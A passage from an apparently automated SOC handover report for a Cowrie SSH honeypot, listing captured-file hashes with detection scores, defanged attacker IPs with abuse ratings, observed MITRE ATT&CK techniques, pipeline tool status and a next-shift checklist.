| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `115.191.15[.]152` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 6 |
| `171.243.149[.]201` | VN | Viettel Group | **100** ⚠️ | 1 |
| `85.173.245[.]55` | RU | OJSC Rostelecom Macroregional Branch South | **100** ⚠️ | 50 |
| `135.237.127[.]71` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `180.76.176[.]249` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 43 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `36.26.74[.]162` | CN | CHINANET-ZJ network | **100** ⚠️ | 50 |
| `180.213.44[.]242` | CN | CHINANET TIANJIN PROVINCE NETWORK | **100** ⚠️ | 39 |
| `210.149.87[.]82` | JP | Thomas of America | **59** | 0 |
| `172.208.62[.]168` | US | Microsoft Limited | 1 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 41 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 10 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 1 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 43 cases |
| Tool 34  | Credential Extractor        | ✅ 18 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 10 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (4.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 9 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 8 priority case(s) shown individually · 8 recon entry/entries in table (4 group(s) consolidating 29 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-15T17:10:05Z_
